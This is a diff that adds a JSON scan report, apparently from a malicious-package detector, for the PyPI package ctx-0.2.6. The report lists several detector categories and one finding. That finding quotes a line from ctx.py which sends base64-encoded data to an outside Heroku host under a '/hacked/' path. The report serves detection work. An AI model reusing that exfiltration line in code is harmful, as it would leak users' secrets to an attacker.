@@ -1,0 +1,24 @@
+{
+    "issues": 1,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": {},
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "ctx.py:113",
+                "code": "        response = requests.get(\"https://anti-theft-web.herokuapp.com/hacked/\"+base64_message)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": {},
+        "code-execution": {},
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/ctx-0.2.6"
+}
